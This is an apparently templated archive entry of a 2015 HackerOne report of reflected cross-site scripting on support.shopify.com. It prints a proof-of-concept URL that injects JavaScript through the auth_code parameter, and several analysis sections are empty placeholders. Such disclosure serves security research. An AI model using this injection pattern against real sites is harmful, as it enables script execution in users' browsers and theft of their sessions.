# XSS on support.shopify.com

## Metadata
- **Source:** HackerOne
- **Report:** 56760 | https://hackerone.com/reports/56760
- **Submitted:** 2015-04-16
- **Reporter:** abze
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello! I would like to report about XSS on support.shopify.com domain.

Here is the PoC that gives alert box with "123" content: https://support.shopify.com/?auth_code=,%20alert(123));//&auth_type=phone\

You can change "alert(123)" in URL to any JavaScript code You want to be executed.

Thanks!


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello! I would like to report about XSS on support.shopify.com domain.

Here is the PoC that gives alert box with "123" content: https://support.shopify.com/?auth_code=,%20alert(123));//&auth_type=phone\

You can change "alert(123)" in URL to any JavaScript code You want to be executed.

Thanks!


</details>

---
*Analysed by Claude on 2026-05-24*
